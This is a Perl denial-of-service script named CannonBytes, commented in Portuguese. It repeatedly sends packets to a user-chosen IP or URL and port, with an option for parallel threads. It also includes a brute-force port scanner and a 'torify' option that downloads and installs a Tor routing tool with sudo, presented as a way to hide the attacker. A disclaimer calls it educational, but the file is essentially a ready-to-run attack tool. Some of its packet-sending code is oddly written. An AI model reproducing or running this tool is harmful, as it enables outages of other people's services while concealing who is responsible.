#!/usr/bin/perl
#
# ESTE SCRIPT TEM A FINALIDADE DE ENSINAR AS PESSOAS COMO QUE FUNCIONA UM ATAQUE DOS ( NEGAÇÃO DE SERVIÇO ).
# NÃO ME RESPONSABILIZO PELO MAL USO DO SCRIPT!
# 
#
# USE, EDITE, COMPILE. MAS SEMPRE DISTRIBUA O CÓDIGO FONTE!
# CONHECIMENTO DEVE SER LIVRE E DE TODOS! 
#
# CODED BY: HackerOrientado
# sigam no twitter -> @HackerOrientado
#


################# MÓDULOS 
use warnings;
use strict;
use threads;
use threads::shared;
use IO::Socket::INET;
use Getopt::Long;

################# INTRODUÇÃO
my $baner ="
   ____
  /    \\
 /  ___/
|  /      _____   _    _   _    _    ____    _    _
|  |___  /  _  | | \\  | | | \\  | |  /    \\  | \\  | |
 \\     \\ | ( ) | | |\\\ | | | |\\ | | |  ()  | | |\\ | |
  \\____/ \\__/\\_| |_|\\\\|_| |_|\\\\|_|  \\____/  |_|\\\\|_|
              _____                                 
             |   _  \\  __    __  _________   _____     ___   
             |  |_|  | \\ \\  / / |___   ___| |  ___|  / __/
             |   ___/_  \\ \\/ /      | |     | |__   / /__
             |   __   \\  \\  /       | |     |  __|  \\__  \\
             |  |__|  |  | |        | |     | |___   __/  |
             |________/  |_|        |_|     |_____| \\____/
                                                             v1.0.0\n\n
";

################# VARIAVEIS
my ( $OS, $limpar, $ajuda, $ip, $porta, $pacote, $vezes, $protocolo, $intervalo, $socket, $site, $i, $threads, $torify, $portscan, $scan, $pergunta );
my ( $thr1, $thr2 );
my $ciclo = 1;
my $escuta = 1;
$OS = $^O;

################# VERIFICAÇÃO DO SISTEMA OPERACIONAL
if ( $OS eq "MSWin32" ) {
	$limpar = ("cls");
} else {
	$limpar = ("clear");
}
system "$limpar";

################# OPÇÕES NO MODO LINHA DE COMANDO
my $opt = GetOptions (
	'h' 		=> \$ajuda,
    'portscan'  => \$portscan,
	'threads' 	=> \$threads,
    'torify'    => \$torify,
);

#################  ARGUMENTO
################# COMANDO DE AJUDA
if ( $ajuda ) {
	print "$baner";
	print "\n\n";
	print "[\!] COMANDO DE AJUDA \n\n\n";
	print "   [\?] >perl CannonBytes\.pl [IP OU URL] Porta Pacote Vezes Protocolo Intervalo\n\n";
	print "    [\?] >perl CannonBytes\.pl 192.168.1.2 80 64000 1000 tcp 60 -torify -threads\n\n";
    pergunta:
    print "\n";
    print "Deseja ler mais o comando de ajuda\?\n";
    print "-> ";
    $pergunta = <STDIN>; chomp $pergunta;
    if ( $pergunta =~ /[N,n]ao/ ) {
	    exit (0);
    } elsif ( $pergunta =~ /[S,s]im/ ) {
        print "-threads         - Usa multi processos para itensificar o ataque\n";
        print "-h               - Mostra o menu de ajuda mais simples\n";
        print "-portscan        - Usa um simples portscan de força bruta para saber quais portas estao abertas\n";
        print "-torify          - Manda todo o trafego da sua internet para a rede Tor. Deixando voce 'camuflado'\n";
        print "\n\n";
        sleep 1;
        exit (0);
    } else {
        print "Resposta nao reconhecida...\n";
        print "Tente usar somente respostas [S,s]im ou [N,n]ao\n";
        sleep 1.5;
        goto pergunta;
    }
}

#################  ARGUMENTO
#################  PORTSCAN-BRUTE
if  ( $portscan ) {
    return port_scan();
}

################# ARGUMENTO 
################# VERIFICAÇÃO E USO DO Torify
################# TORIFY É UM PROJETO CRIADO POR ericpaulbishop QUE ENVIA TODO O TRAFEGO DA INTERNET PARA A REDE Tor USANDO IPTABLES
################# ESTE PROJETO ESTA NO Github A 2 ANOS PORÉM FUNCIONA MUITO BEM!
################# PARA QUEM TIVER DÚVIDAS DE QUEM SEU IP NÃO ESTA CAMUFLADO, VISTIE O SITE check.torproject.org OU USE O COMANDO "tcpdump host [IP QUE VC ESTA ATACANDO]" OU USE O Wireshark
################# EU NÃO CRIEI O Torify, ENTÃO DEVO TODOS OS CRÉDITOS PELA FERRAMENTA AO ericpaulbishop PELA ÓTIMA FERRAMENTA QUE ELE CRIOU :D
################# Github -> https://github.com/ericpaulbishop/iptables_torify
if ( $torify ) {
    if ( $OS eq "MSWin32" ) {
        print "O Torify esta disponivel apenas para ambiente Linux\n";
        print "Se voce ainda nao usa Linux, sugiro que comece a aprender pois e muito importante. Tanto para sua carreira quanto para estudos\n";
        sleep 1;
        exit (0);
    } else {
        if ( -e "/etc/init.d/torify" ) {
            print "Torify instalado :D\n";
            system ("sudo /etc/init.d/torify start");
        } else {
            print "Torify nao instalado D:\n";
            print "Instalando Torify...\n\n";
            sleep 1;
            system ("wget https://github.com/ericpaulbishop/iptables_torify/archive/master.zip -O ~/Downloads/torify.zip");
            system ("sudo apt-get install unzip");
            system ("unzip ~/Downloads/torify.zip");
            system ("mv iptables_torify-master ~/Downloads");
            system ("sudo sh ~/Downloads/iptables_torify-master/debian_install.sh");
            if ( -e "/etc/init.d/torify" ) {
                print "\n\n";
                print "Torify instalado com sucesso :D\n";
                print "Execute o script mais uma vez :D\n";
                exit (0);
            } else {
                print "\n\n";
                print "Ouve algum problema na instalação...\n";
                print "Verifique se contem o arquivo torify no diretorio /etc/init.d/\n";
                print "Tente executar novamente o comando -torify no CannonBytes.pl\n";
                open FILE, ">torify.txt" or die "Impossivel criar arquivo torify.txt\n";
                print FILE "https://github.com/ericpaulbishop/iptables_torify/archive/master.zip";
                close FILE;
                print "Se nao, tente baixar o arquivo no Github no link que vai estar dentro do arquivo de texto com o nome de torify.txt\n";
            }
        }
    }
}

#################  ARGUMENTO
################# CRIAÇÃO DAS THREADS E EXECUÇÃO DAS DUAS AO MESMO TEMPO!
if ( $threads ) {
    $thr1 = threads->create('thr1', '1');
    $thr2 = threads->create('thr2', '2');
    $thr1,$thr2->join();
} else {
	return thr1();
}

################# SUB ROTINA DA THREAD 1
sub thr1 {
	my $ARGC = @ARGV;
	
	if ( ($ip, $porta, $pacote, $vezes, $protocolo, $intervalo) = @ARGV ) {
		goto args;
	} else { 
		print "$baner";
		print "Digite o IP ou URL\n";
		print "-> ";
		$ip = <STDIN>; chomp $ip;
	
		print "\n\n";
		print "Agora digite a porta que deseja atacar\n";
		print "-> ";
		$porta = <STDIN>; chomp $porta;
	
		dados:
		print "\n\n";
		print "Digite o tamanho do pacote que sera enviado\n";
		print "-> ";
		$pacote = <STDIN>; chomp $pacote;
		if ( $pacote > 64000 ) {
			sleep 1.5;
			print "Digite valores entre 32 e 64000!\n\n";
			goto dados;
		}	
	
		print "\n\n";
		print "Digite o numero de vezes que sera atacado o alvo\n";
		print "-> ";
		$vezes = <STDIN>; chomp $vezes;
	
		print "\n\n";
		print "Digite qual o tipo de protocolo que vc deseja usar para o ataque\n";
		print "-> ";
		$protocolo = <STDIN>; chomp $protocolo;
	
		print "\n\n";
		print "Digite o valor do intervalo de tempo entre os ataques\n";
		print "-> ";
		$intervalo = <STDIN>; chomp $intervalo;

		args:
		system "$limpar";
		print "$baner\nAperte Ctrl+C para parar o ataque\n\n";
        sleep 2;
	
		ataque:

################# CRIAÇÃO DOS SOCKETS
		$socket = IO::Socket::INET->new (
			PeerAddr 	=> $ip, 
			PeerPort 	=> $porta, 
			Proto 		=> $protocolo ) or die "Nao foi possivel se conectar ao IP ou Porta.\nCheque se tudo esta correto!\n";
		
################# ATAQUE E LOOP
		if ( $ip =~ /www./ ) {
			$site = "site";
		} else {
			$site = "ip";
		}
for ( $i = 0; $i < $vezes; $i++ ) {
			size => $pacote;
			$ciclo => 1,
			$escuta => 1,
			print "Atacando o $site $ip na porta $porta com o tamanho do pacote $pacote\n";
			send ($socket, $pacote, $ciclo, $escuta);
		}
	
################# INTERVALO DO LOOP

		print "\n\n";
		print "O programa vai esperar $intervalo segundo ate o proximo ataque.\n";
		sleep $intervalo;
		print "\n";
		goto ataque;

	}
}

################# SUB ROTINA DA THREAD 2
sub thr2 {
	sleep 2;
	my $ARGC = @ARGV;

	if ( ($ip, $porta, $pacote, $vezes, $protocolo, $intervalo) = @ARGV ) {
		goto ataque;
	}

	ataque:	
################# CRIAÇÃO DOS SOCKETS
	$socket = IO::Socket::INET->new (
		PeerAddr 	=> $ip, 
		PeerPort 	=> $porta, 
		Proto 		=> $protocolo ) or die "Nao foi possivel se conectar ao IP ou Porta.\nCheque se tudo esta correto!\n";
		
################# ATAQUE E LOOP
	if ( $ip =~ /www./ ) {
		$site = "site";
	} else {
		$site = "ip";
	}
	for ( $i = 0; $i < $vezes; $i++ ) {
	size => $pacote;
	$ciclo => 1,
	$escuta => 1,
	print "Atacando o $site $ip na porta $porta com o tamanho do pacote $pacote\n";
	send ($socket, $pacote, $ciclo, $escuta);
	}
	
################# INTERVALO DO LOOP :D
	print "\n\n";
	print "O programa vai esperar $intervalo segundo ate o proximo ataque.\n";
	sleep $intervalo;
	print "\n";
	goto ataque;
}

################# SUB ROTINA DO PORTSCAN
sub port_scan {
    print "$baner";
    print "Digite a URL/IP\n";
    print "-> ";
    $ip = <STDIN>; chomp $ip;

    scan:
    for ( $i = 1; $i < 999999 ; $i++ ) {
	    print "\n";
	    print "Escaneando URL/IP $ip na porta $i";
	    print "\n";
	    $scan = IO::Socket::INET->new (
		    PeerAddr => $ip, 
		    PeerPort => $i,
		    Proto => 'tcp',
		    Timeout => 1,
	    ) or print "Porta $i fechada D:\n";

	    if ( $scan ) {
	        print "\t[!] Porta $i aberta [!]\n";
	        open FILE, ">>IPs.txt";
	        print FILE "Porta $i do URL/IP $ip aberta!\n";
	        close FILE;
	    }
    } 
}

# EOF #